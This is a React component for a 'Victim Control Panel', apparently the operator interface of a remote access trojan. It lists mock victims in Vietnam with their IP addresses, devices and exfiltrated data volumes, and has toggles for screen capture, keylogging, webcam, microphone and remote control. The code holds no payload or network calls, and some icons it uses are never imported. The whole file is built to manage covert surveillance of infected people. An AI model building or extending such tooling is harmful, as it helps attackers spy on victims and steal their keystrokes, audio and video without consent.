import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '../ui/card';
import { Button } from '../ui/button';
import { Input } from '../ui/input';
import { Badge } from '../ui/badge';
import { ScrollArea } from '../ui/scroll-area';
import { motion } from 'framer-motion';
import {
  Search,
  Monitor,
  Keyboard,
  Camera,
  Mic,
  MousePointer,
  Globe,
  MapPin,
  Clock,
  Activity,
  Users,
  Server,
  Zap,
  Settings
} from 'lucide-react';
import VictimManagementModal from './VictimManagementModal';

// Mock victim data
const mockVictims = [
  {
    id: 1,
    name: 'Target_User_001',
    ip: '192.168.1.50',
    location: 'Hà Nội, VN',
    device: 'Windows 11 - Chrome',
    status: 'online',
    lastSeen: '2 phút trước',
    actions: {
      screen: true,
      keylog: true,
      webcam: false,
      mic: false,
      control: false
    },
    sessions: 3,
    data: '2.3GB'
  },
  {
    id: 2,
    name: 'Target_User_002',
    ip: '10.0.0.25',
    location: 'TP.HCM, VN',
    device: 'MacOS - Safari',
    status: 'away',
    lastSeen: '15 phút trước',
    actions: {
      screen: false,
      keylog: true,
      webcam: false,
      mic: false,
      control: false
    },
    sessions: 1,
    data: '850MB'
  },
  {
    id: 3,
    name: 'Target_User_003',
    ip: '172.16.0.100',
    location: 'Đà Nẵng, VN',
    device: 'Android - Chrome Mobile',
    status: 'offline',
    lastSeen: '2 giờ trước',
    actions: {
      screen: false,
      keylog: false,
      webcam: false,
      mic: false,
      control: false
    },
    sessions: 0,
    data: '1.2GB'
  }
];

const getStatusBadge = (status) => {
  const statusConfig = {
    'online': { color: 'bg-green-500/20 text-green-400 border-green-500/30', icon: CheckCircle, text: 'Online' },
    'away': { color: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/30', icon: Clock, text: 'Away' },
    'offline': { color: 'bg-red-500/20 text-red-400 border-red-500/30', icon: AlertTriangle, text: 'Offline' }
  };
  
  const config = statusConfig[status] || statusConfig['offline'];
  const IconComponent = config.icon;
  
  return (
    <Badge className={`${config.color} border flex items-center gap-1`}>
      <IconComponent className="w-3 h-3" />
      {config.text}
    </Badge>
  );
};

const ActionButton = ({ action, active, onClick, icon: Icon, label }) => {
  return (
    <Button
      size="sm"
      variant="outline"
      onClick={onClick}
      className={`h-8 px-3 border transition-all ${
        active 
          ? 'bg-blue-500/20 text-blue-400 border-blue-500/30 hover:bg-blue-500/30' 
          : 'bg-gray-500/10 text-gray-400 border-gray-500/30 hover:bg-gray-500/20'
      }`}
    >
      <Icon className="w-3 h-3 mr-1" />
      {label}
    </Button>
  );
};

const VictimControl = () => {
  const [victims, setVictims] = useState(mockVictims);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedVictim, setSelectedVictim] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);

  const toggleAction = (victimId, actionType) => {
    setVictims(prev => prev.map(victim => 
      victim.id === victimId 
        ? {
            ...victim,
            actions: {
              ...victim.actions,
              [actionType]: !victim.actions[actionType]
            }
          }
        : victim
    ));
  };

  const filteredVictims = victims.filter(victim =>
    victim.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    victim.ip.includes(searchTerm) ||
    victim.location.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const openVictimModal = (victim) => {
    setSelectedVictim(victim);
    setIsModalOpen(true);
  };

  return (
    <>
      <Card className="bg-gradient-to-br from-slate-900/95 to-slate-800/95 border-slate-700">
        <CardHeader>
          <CardTitle className="flex items-center justify-between text-white">
            <div className="flex items-center gap-2">
              <Users className="h-5 w-5 text-blue-400" />
              <span>Victim Control Panel</span>
            </div>
            <Badge className="bg-green-500/20 text-green-400">
              {victims.filter(v => v.status === 'online').length} Online
            </Badge>
          </CardTitle>
          <div className="flex items-center gap-4 mt-4">
            <Input
              placeholder="Tìm kiếm victim..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="max-w-xs bg-slate-800 border-slate-600 text-white"
            />
            <div className="flex gap-2 text-sm text-slate-400">
              <span className="flex items-center gap-1">
                <div className="w-2 h-2 bg-green-400 rounded-full"></div>
                {victims.filter(v => v.status === 'online').length} Online
              </span>
              <span className="flex items-center gap-1">
                <div className="w-2 h-2 bg-yellow-400 rounded-full"></div>
                {victims.filter(v => v.status === 'away').length} Away
              </span>
              <span className="flex items-center gap-1">
                <div className="w-2 h-2 bg-red-400 rounded-full"></div>
                {victims.filter(v => v.status === 'offline').length} Offline
              </span>
            </div>
          </div>
      </CardHeader>
      <CardContent>
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-slate-700">
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Victim ID</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">IP Address</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Location</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Device</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Status</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Last Seen</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Actions</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Sessions</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Data</th>
                <th className="text-left py-3 px-2 text-slate-300 font-medium">Control</th>
              </tr>
            </thead>
            <tbody>
              {filteredVictims.map((victim) => (
                <tr key={victim.id} className="border-b border-slate-800 hover:bg-slate-800/30 transition-colors">
                  <td className="py-3 px-2 text-blue-400 font-medium">{victim.name}</td>
                  <td className="py-3 px-2 text-slate-300 font-mono text-sm">{victim.ip}</td>
                  <td className="py-3 px-2 text-slate-300">{victim.location}</td>
                  <td className="py-3 px-2 text-slate-300 text-sm">{victim.device}</td>
                  <td className="py-3 px-2">{getStatusBadge(victim.status)}</td>
                  <td className="py-3 px-2 text-slate-400 text-sm">{victim.lastSeen}</td>
                  <td className="py-3 px-2">
                    <div className="flex gap-1">
                      <ActionButton
                        action="screen"
                        active={victim.actions.screen}
                        onClick={() => toggleAction(victim.id, 'screen')}
                        icon={Monitor}
                        label="Screen"
                      />
                      <ActionButton
                        action="keylog"
                        active={victim.actions.keylog}
                        onClick={() => toggleAction(victim.id, 'keylog')}
                        icon={Keyboard}
                        label="Keylog"
                      />
                    </div>
                  </td>
                  <td className="py-3 px-2 text-center">
                    <Badge className="bg-purple-500/20 text-purple-400 border-purple-500/30 border">
                      {victim.sessions}
                    </Badge>
                  </td>
                  <td className="py-3 px-2 text-slate-300 text-sm">{victim.data}</td>
                  <td className="py-3 px-2">
                    <div className="flex gap-1">
                      <ActionButton
                        action="webcam"
                        active={victim.actions.webcam}
                        onClick={() => toggleAction(victim.id, 'webcam')}
                        icon={Camera}
                        label="Cam"
                      />
                      <ActionButton
                        action="mic"
                        active={victim.actions.mic}
                        onClick={() => toggleAction(victim.id, 'mic')}
                        icon={Mic}
                        label="Mic"
                      />
                      <ActionButton
                        action="control"
                        active={victim.actions.control}
                        onClick={() => toggleAction(victim.id, 'control')}
                        icon={MousePointer}
                        label="Control"
                      />
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        
        {/* Quick Stats */}
        <div className="mt-6 grid grid-cols-2 md:grid-cols-4 gap-4">
          <div className="bg-slate-800/50 rounded-lg p-3 text-center">
            <div className="text-2xl font-bold text-blue-400">{victims.length}</div>
            <div className="text-xs text-slate-400">Total Victims</div>
          </div>
          <div className="bg-slate-800/50 rounded-lg p-3 text-center">
            <div className="text-2xl font-bold text-green-400">
              {victims.filter(v => v.actions.screen).length}
            </div>
            <div className="text-xs text-slate-400">Active Screens</div>
          </div>
          <div className="bg-slate-800/50 rounded-lg p-3 text-center">
            <div className="text-2xl font-bold text-yellow-400">
              {victims.filter(v => v.actions.keylog).length}
            </div>
            <div className="text-xs text-slate-400">Keyloggers</div>
          </div>
          <div className="bg-slate-800/50 rounded-lg p-3 text-center">
            <div className="text-2xl font-bold text-purple-400">
              {victims.reduce((sum, v) => sum + v.sessions, 0)}
            </div>
            <div className="text-xs text-slate-400">Total Sessions</div>
          </div>
        </div>
      </CardContent>
    </Card>
    
    <VictimManagementModal
      victim={selectedVictim}
      isOpen={isModalOpen}
      onClose={() => {
        setIsModalOpen(false);
        setSelectedVictim(null);
      }}
    />
    </>
  );
};

export default VictimControl;
